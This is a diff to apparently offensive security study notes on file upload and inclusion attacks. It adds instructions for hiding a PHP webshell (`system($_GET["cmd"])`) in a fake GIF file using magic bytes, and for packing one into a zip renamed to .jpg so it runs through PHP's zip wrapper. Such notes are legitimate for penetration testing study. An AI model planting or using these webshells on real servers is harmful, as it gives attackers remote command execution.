@@ -162,4 +162,12 @@ Below is a way to create a GIF file that is actually a webshell:
 ```
 echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
 ```
-We only need to remember to add GIF8 to the beginning then it would be fine (GIF8 is the magic byte of FI)
+We only need to remember to add GIF8 to the beginning then it would be fine (GIF8 is the magic byte of GIF files)
+
+Accessing Malicious GIF by the zip wrapper:
+
+If the zip wrapper is enabled, we can use it to execute PHP code in zip format, the follwoign is how to create a shell zip:
+```
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+```
+Notice that the file we upload would still be detected as a zip file, even though we zipped shell.php into shell.jpg, the rate of success would be higher if the website natively allows one to upload zip file
